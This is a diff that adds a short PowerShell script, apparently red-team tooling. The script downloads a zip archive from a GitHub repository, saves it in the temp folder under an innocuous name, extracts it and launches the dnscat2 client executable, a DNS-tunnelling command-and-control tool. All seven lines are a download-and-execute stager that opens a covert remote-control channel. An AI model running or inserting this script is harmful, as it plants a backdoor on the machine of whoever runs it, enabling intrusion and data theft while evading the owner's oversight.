@@ -1,0 +1,7 @@
+$webClient = New-Object System.Net.WebClient
+$url1 = "https://github.com/sh1katagana1/RedTeam/raw/refs/heads/main/dnscat.zip"
+$zipPath1 = "$env:TEMP\pgrt1.zip"
+$webClient.DownloadFile($url1, $zipPath1)
+$extractPath1 = "$env:TEMP\file"
+Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
+Start-Process -FilePath $env:TEMP\file\dnscat2-v0.07-client-win32.exe
